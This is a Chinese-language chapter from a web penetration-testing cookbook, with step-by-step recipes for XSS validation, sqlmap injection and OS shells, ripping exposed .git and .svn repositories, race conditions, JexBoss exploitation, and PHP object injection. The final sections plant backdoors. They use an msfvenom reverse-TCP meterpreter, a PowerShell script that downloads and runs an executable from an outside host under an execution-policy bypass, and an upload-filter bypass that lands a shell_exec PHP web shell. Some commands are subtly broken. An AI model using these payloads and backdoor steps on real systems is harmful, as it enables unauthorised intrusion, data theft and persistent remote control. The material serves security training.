# Web 应用程序利用-超越 OWASP 十大

在本章中，我们将介绍以下示例：

+   使用 XSS 验证器利用 XSS

+   使用`sqlmap`进行注入攻击

+   拥有所有`.svn`和`.git`存储库

+   赢得竞争条件

+   使用 JexBoss 利用 JBoss

+   利用 PHP 对象注入

+   使用 Web shell 和 meterpreter 设置后门

# 介绍

在 OWASP 十大中，我们通常看到查找和利用漏洞的最常见方式。在本章中，我们将介绍在寻找 Web 应用程序中的漏洞时可能遇到的一些不常见情况。

# 使用 XSS 验证器利用 XSS

虽然 XSS 已经被 Burp、Acunetix 等各种工具检测到，但 XSS 验证器非常方便。它是专为自动验证 XSS 漏洞而设计的 Burp 入侵者和扩展程序。

它基于 SpiderLabs 的博客文章[`blog.spiderlabs.com/2013/02/server-site-xss-attack-detection-with-modsecurity-and-phantomjs.html`](http://blog.spiderlabs.com/2013/02/server-site-xss-attack-detection-with-modsecurity-and-phantomjs.html)。

# 做好准备

要在以下示例中使用该工具，我们需要在我们的机器上安装 SlimerJS 和 PhantomJS。

# 如何做...

以下步骤演示了 XSS 验证器：

1.  我们打开 Burp 并切换到扩展程序选项卡：

![](img/340ecd29-1c09-4b7d-a6ed-ab0cc040f60c.png)

1.  然后，我们安装 XSS 验证器扩展程序：

![](img/41724867-7fed-4714-b23c-3e42f3d6dcc3.png)

1.  安装完成后，我们将在 Burp 窗口中看到一个名为 xssValidator 的新选项卡：

![](img/433f6113-9b8a-41df-a1c9-ac9421d41fb9.png)

1.  接下来，我们安装 PhantomJS 和 SlimerJS；这可以在 Kali 上用几个简单的命令完成。

1.  我们使用`wget`从互联网下载 PhantomJS 文件：

```
 sudo wget https://bitbucket.org/ariya/phantomjs/downloads/
        phantomjs-1.9.8-linux-x86_64.tar.bz2
```

1.  我们使用以下命令提取它：

```
 tar jxvf phantomjs-1.9.8-linux-x86_64.tar.bz2
```

以下截图显示了前面命令下载 PhantomJS 文件的文件夹：

![](img/d73703dd-292f-4cd3-bb74-af87cf63c49a.png)

1.  现在我们可以使用`cd`浏览文件夹，最简单的方法是将 PhantomJS 可执行文件复制到`/usr/bin`：

```
 cp phantomjs /usr/local/bin
```

以下截图显示了前面命令的输出：

![](img/2d8228a7-84f6-454d-882e-f9c2ccc8fae7.png)

1.  要验证我们是否可以在终端中输入`phantomjs -v`命令并显示版本。

1.  类似地，要安装 SlimerJS，我们从官方网站下载它：

[`slimerjs.org/download.html`](http://slimerjs.org/download.html)。

1.  我们首先使用以下命令安装依赖项：

```
 sudo apt-get install libc6 libstdc++6 libgcc1 xvfb
```

1.  现在我们使用以下命令提取文件：

```
 tar jxvf slimerjs-0.8.4-linux-x86_64.tar.bz2
```

1.  然后，我们浏览目录，简单地将 SlimerJS 可执行文件复制到`/usr/local/bin`：

![](img/8a0702cc-7da1-477e-84f3-f2bf8462cab2.png)

1.  然后，我们执行以下命令：

```
 cp slimerjs /usr/local/bin/
```

以下截图显示了前面命令的输出：

![](img/41680f08-dd26-41ae-872e-b17546584451.png)

1.  现在我们需要导航到 XSS 验证器文件夹。

1.  然后，我们需要使用以下命令启动 PhantomJS 和 SlimerJS 服务器：

```
 phantomjs xss.js & slimerjs slimer.js &
```

1.  服务器运行后，我们返回到 Burp 窗口。在右侧的 XSS 验证器选项卡中，我们将看到扩展程序将在请求上测试的负载列表。我们也可以手动输入我们自己的负载：

![](img/795477e2-b319-41b8-b6c1-518d46c81cfc.png)

1.  接下来，我们捕获需要验证 XSS 的请求。

1.  我们选择发送到入侵者选项：

![](img/48b5b90e-f0fa-463e-986f-e85f3d6d309a.png)

1.  然后，我们切换到入侵者窗口，在位置选项卡下，设置我们想要测试 XSS 负载的位置。用`§`包围的值是攻击期间将插入负载的位置：

![](img/12c86f32-6eab-428f-9355-283e29dc5720.png)

1.  在负载选项卡中，我们将负载类型选择为扩展生成的：

![](img/f06ce3bb-6051-4cfe-90ac-e667045c54eb.png)

1.  在负载选项中，我们点击选择生成器...并选择 XSS 验证器负载：

![](img/653b5ad9-e114-476c-9b29-42a70d8450bf.png)

1.  接下来，我们切换到 XSS 验证器选项卡，并复制 Grep 短语；这个短语也可以自定义：

![](img/a8e61d10-0658-4bd6-8d25-38b95d66cd15.png)

1.  接下来，我们切换到 Intruder 选项卡中的选项，并在 Grep - Match 中添加复制的短语：

![](img/a80d507b-e6b1-4dbb-8349-099cf3a6ab5b.png)

1.  我们点击开始攻击，然后我们会看到一个弹出窗口：

![](img/b5aa5280-5e74-400e-b817-4336f3e591c1.png)

1.  在这里，我们将看到在我们的 Grep 短语列中带有检查标记的请求已成功验证：

![](img/014009ae-d513-447c-ba6e-468bdc026942.png)

# 使用 sqlmap 进行注入攻击

`sqlmap`工具是一个用 Python 构建的开源工具，允许检测和利用 SQL 注入攻击。它完全支持 MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM Db2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB 和 Informix 数据库。在这个食谱中，我们将介绍如何使用 sqlmap 来测试和利用 SQL 注入。

# 如何做...

以下是使用`sqlmap`的步骤：

1.  我们首先查看`sqlmap`的帮助，以更好地了解其功能。这可以使用以下命令完成：

```
 sqlmap -h
```

以下屏幕截图显示了上述命令的输出：

![](img/c825353f-95f8-4485-a504-ffed2f2db7b1.png)

1.  要扫描 URL，我们使用以下命令：

```
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1"
```

1.  一旦检测到 SQL，我们可以选择是（`Y`）跳过其他类型的有效载荷：

![](img/ad4a1923-1b9b-4708-a428-b7879594a9f3.png)

1.  一旦检测到 SQL，我们可以使用`--dbs`标志列出数据库名称：

![](img/bca5b5f9-b626-4e6c-b1cc-27064df38efa.png)

1.  我们现在有了数据库；同样，我们可以使用`--tables`和`--columns`等标志来获取表名和列名：

![](img/b87d57a3-41e6-46c0-9655-ccffa009ad42.png)

1.  要检查用户是否是数据库管理员，我们可以使用`--is-dba`标志：

![](img/1f84de64-83b1-47d0-a6d7-4d3571701b52.png)

1.  `sqlmap`命令有很多标志。我们可以使用以下表格来查看不同类型的标志以及它们的作用：

| **标志** | **操作** |
| --- | --- |
| `--tables` | 转储所有表名 |
| `-T` | 指定要执行操作的表名 |
| `--os-cmd` | 执行操作系统命令 |
| `--os-shell` | 提示系统命令 shell |
| `-r` | 指定要在其上运行 SQL 测试的文件名 |
| `--dump-all` | 转储所有内容 |
| `--tamper` | 使用篡改脚本 |
| `--eta` | 显示剩余的估计时间以转储数据 |
| `--dbs=MYSql,MSSQL,Oracle` | 我们可以手动选择数据库，仅对特定类型的数据库执行注入 |
| `--proxy` | 指定代理 |

# 另请参阅

+   *使用 Web shell 的后门*食谱

+   *使用 meterpreters 的后门*食谱

# 拥有所有的.svn 和.git 存储库

该工具用于破解版本控制系统，如 SVN、Git 和 Mercurial/hg、Bazaar。该工具是用 Python 构建的，使用起来非常简单。在这个食谱中，您将学习如何使用该工具来破解存储库。

这种漏洞存在是因为大多数情况下，在使用版本控制系统时，开发人员会将他们的存储库托管在生产环境中。留下这些文件夹允许黑客下载整个源代码。

# 如何做...

以下步骤演示了存储库的使用：

1.  我们可以从 GitHub 下载`dvcs-ripper.git`：

```
 git clone https://github.com/kost/dvcs-ripper.git
```

1.  我们浏览`dvcs-ripper`目录：

![](img/5dfd0caa-7f46-4707-8980-420bb267ffbb.png)

1.  要破解 Git 存储库，命令非常简单：

```
 rip-git.pl -v -u http://www.example.com/.git/
```

1.  我们让它运行，然后我们应该看到一个`.git`文件夹被创建，在其中，我们应该看到源代码：

![](img/cc8d52b0-a1c6-49b6-9cfa-35c50a10acf9.png)

1.  同样，我们可以使用以下命令来破解 SVN：

```
 rip-svn.pl -v -u http://www.example.com/.svn/
```

# 赢得竞争条件

当在多线程 Web 应用程序中对相同数据执行操作时，会发生竞争条件。当执行一个操作的时间影响另一个操作时，它基本上会产生意外的结果。

具有竞争条件漏洞的应用程序的一些示例可能是允许从一个用户向另一个用户转移信用的应用程序，或者允许添加折扣券代码以获得折扣的应用程序，这也可能存在竞争条件，这可能允许攻击者多次使用相同的代码。

# 如何做...

我们可以使用 Burp 的入侵者执行竞争条件攻击，如下所示：

1.  我们选择请求，然后单击“发送到入侵者”：

![](img/ed7fba7b-5504-46f1-8edd-b03504d7598e.png)

1.  我们切换到选项选项卡，并设置我们想要的线程数，通常`20`到`25`就足够了：

![](img/5bbe6543-a0bc-4ec0-81c2-45a7fe3217a9.png)

1.  然后，在有效载荷选项卡中，我们选择有效载荷类型中的空有效载荷，因为我们要重播相同的请求：

![](img/1c034f5f-ccbc-4756-a1dd-32cfb88d2142.png)

1.  然后，在有效载荷选项中，我们选择要播放请求的次数。

1.  由于我们实际上不知道应用程序的性能如何，因此无法完全猜测我们需要重播请求的次数。

1.  现在，我们点击“开始攻击”。如果攻击成功，我们应该看到期望的结果。

# 另请参阅

您可以参考以下文章以获取更多信息：

+   [`antoanthongtin.vn/Portals/0/UploadImages/kiennt2/KyYeu/DuLieuTrongNuoc/Dulieu/KyYeu/07.race-condition-attacks-in-the-web.pdf`](http://antoanthongtin.vn/Portals/0/UploadImages/kiennt2/KyYeu/DuLieuTrongNuoc/Dulieu/KyYeu/07.race-condition-attacks-in-the-web.pdf)

+   [`sakurity.com/blog/2015/05/21/starbucks.html`](https://sakurity.com/blog/2015/05/21/starbucks.html)

+   [`www.theregister.co.uk/2016/10/21/linux_privilege_escalation_hole/`](http://www.theregister.co.uk/2016/10/21/linux_privilege_escalation_hole/)

# 使用 JexBoss 利用 JBoss

JexBoss 是用于测试和利用 JBoss 应用服务器和其他 Java 应用服务器（例如 WebLogic，GlassFish，Tomcat，Axis2 等）中的漏洞的工具。

它可以在[`github.com/joaomatosf/jexboss`](https://github.com/joaomatosf/jexboss)下载。

# 如何做...

我们首先导航到我们克隆 JexBoss 的目录，然后按照给定的步骤进行操作：

1.  我们使用以下命令安装所有要求：

```
 pip install -r requires.txt
```

以下屏幕截图是上述命令的示例：

![](img/6f40d300-f99a-498f-a52e-bc78a6412ac6.png)

1.  要查看帮助，我们输入以下内容：

```
 python jexboss.py -h
```

以下屏幕截图显示了上述命令的输出：

![](img/0434aeba-f83b-4617-a7ac-a6017da624e6.png)

1.  要利用主机，我们只需输入以下命令：

```
 python jexboss.py -host http://target_host:8080
```

以下屏幕截图是上述命令的示例：

![](img/2110d739-1384-45d6-8981-7e1cc22f5e8b.png)

这向我们展示了漏洞。

![](img/9cd41e0b-44f8-4fa0-a77b-e102ad4e3251.png)

1.  我们输入`yes`以继续利用：

![](img/8f96a6d4-16ef-4f7d-9c94-68c1f245188f.png)

1.  这给我们在服务器上提供了一个 shell：

![](img/cc88ef97-f384-4230-8b44-ca2766686425.png)

# 利用 PHP 对象注入

当不安全的用户输入通过 PHP `unserialize()`函数传递时，就会发生 PHP 对象注入。当我们将一个类的对象的序列化字符串传递给应用程序时，应用程序会接受它，然后 PHP 会重建对象，并且通常会调用魔术方法（如果它们包含在类中）。一些方法是`__construct()`，`__destruct()`，`__sleep()`和`__wakeup()`。

这导致 SQL 注入，文件包含，甚至远程代码执行。但是，为了成功利用这一点，我们需要知道对象的类名。

# 如何做...

以下步骤演示了 PHP 对象注入：

1.  在这里，我们有一个应用程序，它在`get`参数中传递序列化数据：

![](img/23b23bcb-dc82-4f1d-9028-5c27fb399a67.png)

1.  由于我们有源代码，我们将看到该应用程序正在使用`__wakeup()`函数，类名为`PHPObjectInjection`：

![](img/8646771c-8982-4e2e-86d5-376fc9d64923.png)

1.  现在我们可以编写一个具有相同类名的代码，以生成包含我们要在服务器上执行的自己的命令的序列化对象：

```
        <?php
            class PHPObjectInjection{
                 public $inject = "system('whoami');";
            }
            $obj = new PHPObjectInjection;
            var_dump(serialize($obj));
        ?>
```

1.  我们将代码保存为 PHP 文件并运行代码，我们应该有序列化的输出：

![](img/722b5d72-d65b-4dbf-a47c-b963ad9be4eb.png)

1.  我们将此输出传递到`r`参数中，我们看到这里显示用户：

![](img/45e43049-e12f-47a4-aa54-aed864c3dd94.png)

1.  让我们尝试传递另一个命令，`uname -a`。我们使用我们创建的 PHP 代码生成它：

![](img/baba11b2-ced5-44a8-9be8-3481636bf437.png)

1.  然后我们将输出粘贴到 URL 中：

![](img/1f6d11b5-85fe-4ebc-8495-9c6469c8c82c.png)

1.  现在我们看到正在执行的命令，输出如下：

![](img/8cb4d30f-41cf-41c2-94f9-e2aa8e980bee.png)

# 另请参阅

+   [`mukarramkhalid.com/php-object-injection-serialization/#poi-example-2`](https://mukarramkhalid.com/php-object-injection-serialization/#poi-example-2)

+   [`crowdshield.com/blog.php?name=exploiting-php-serialization-object-injection-vulnerabilities`](https://crowdshield.com/blog.php?name=exploiting-php-serialization-object-injection-vulnerabilities)

+   [`www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/`](https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/)

# 使用 web shell 的后门

上传 web shell 很有趣；上传 web shell 可以让我们在服务器上更多地浏览。在这个教程中，您将学习一些我们可以在服务器上上传 shell 的方法。

# 如何做...

以下步骤演示了 web shell 的使用：

1.  我们首先通过使用`--is-dba`标志运行 sqlmap 来检查用户是否为 DBA：

![](img/19a19e66-693e-4efd-ab17-53108d5e0191.png)

1.  然后，我们使用`os-shell`，它提示我们一个 shell。然后我们运行命令来检查我们是否有权限：

```
 whoami
```

前面的命令的示例如下：

![](img/bcc389a3-6623-49f8-9750-e21e2cbf1cd5.png)

1.  幸运的是，我们有管理员权限。但我们没有 RDP 可以提供给外部用户。让我们尝试另一种方法，使用 PowerShell 获取 meterpreter 访问权限。

1.  我们首先创建一个`System.Net.WebClient`对象，并将其保存为 PowerShell 脚本在系统上：

```
 echo $WebClient = New-Object System.Net.WebClient > abc.ps1
```

1.  现在我们通过以下命令使用`msfvenom`创建我们的`meterpreter.exe`：

```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address>
    LPORT=<Your Port to Connect On> -f exe > shell.exe
```

1.  现在，我们需要下载我们的 meterpreter，所以我们在我们的`abc.ps1`脚本中添加以下命令：

```
 echo $WebClientDownloadFile(http://odmain.com/meterpreter.exe,
        "D:\video\b.exe") >> abc.ps1
```

以下截图是前面命令的示例：

![](img/1146fc5b-8f64-4155-b5f9-0d63506a28b6.png)

1.  默认情况下，PowerShell 配置为阻止在 Windows 系统上执行`.ps1`脚本。但仍有一种惊人的方法可以执行脚本。我们使用以下命令：

```
 powershell -executionpolicy bypass -file abc.ps1
```

前面的命令的示例如下：

![](img/75492280-4ddf-433d-bc55-8d3b0e6e40f2.png)

1.  接下来，我们转到目录`D:/video/meterpreter.exe`，我们的文件已下载，并使用以下命令执行它：

```
 msfconsole
```

前面的命令将打开 msf，如下截图所示：

![](img/2bef0c4f-faa1-4b6f-98f0-6436fede6833.png)

# 使用 meterpreter 的后门

有时，我们可能还会遇到最初用于上传文件（如 Excel、照片等）的文件上传，但有一些方法可以绕过它。在这个教程中，您将看到如何做到这一点。

# 如何做...

以下步骤演示了 meterpreter 的使用：

1.  在这里，我们有一个上传照片的 web 应用程序：

![](img/20015428-2d33-4c72-aac2-2e4987f00419.png)

1.  当我们上传照片时，这是我们在应用程序中看到的：

![](img/32380e31-b3f9-4a6b-bfd6-db71db172b93.png)

1.  让我们看看如果我们上传一个`.txt`会发生什么。我们创建一个带有测试数据的文件：

![](img/d2d5ccb1-bb1a-4673-9073-d3d74b8e2718.png)

1.  让我们尝试上传它：

![](img/538fb14d-b1b3-4931-adc0-a04bb9cbee66.png)

1.  我们的图片已被删除！这可能意味着我们的应用程序正在进行客户端或服务器端的文件扩展名检查：

![](img/66cfba69-5774-4673-bf53-5286ebc30ec4.png)

1.  让我们尝试绕过客户端检查。我们在 Burp 中拦截请求，尝试更改提交的数据中的扩展名：

![](img/3c2bce9c-ab7c-4fb5-92d1-4d09356abbdc.png)

1.  现在我们将扩展名从`.txt`更改为`.txt;.png`，然后点击前进：

![](img/a58f8519-a8e2-4d6c-a521-e0495ed45262.png)

这仍在被删除，这告诉我们应用程序可能具有服务器端检查。

绕过的一种方法是在我们想要执行的代码中添加一个图像的头部。

1.  我们添加头部`GIF87a`并尝试上传文件：

![](img/b64944a2-7953-471b-b410-37cc790ab763.png)

然后我们上传这个：

![](img/59b34ecd-7496-47c1-a47d-d5e0d54c7593.png)

1.  我们看到文件已经上传。

1.  现在我们尝试添加我们的 PHP 代码：

```
        <?php
            $output = shell_exec('ls -lart');
            echo "<pre>$output</pre>";
        ?>
```

![](img/0725ad0d-0e6a-42cc-acca-471888d6c322.png)

但是我们的 PHP 仍未被执行。

1.  然而，还有其他文件格式，如`.pht`、`.phtml`、`.phtm`、`.htm`等。让我们尝试`.pht`。

![](img/2a642eab-1083-4d72-a8bb-25bf4b6201d7.png)

我们的文件已经上传。

![](img/259298d1-2bc0-4060-9a5d-6f03c2a172c1.png)

1.  我们浏览文件并看到它已被执行！

![](img/814041e7-29f8-46d2-954c-5e4f6659f83f.png)

1.  让我们尝试执行一个基本命令：

```
 ?c=whoami
```

![](img/b6146f1b-ff1d-4e40-bb72-47c67a5fba9b.png)

我们可以看到我们的命令已成功执行，我们已经在服务器上上传了我们的 shell。
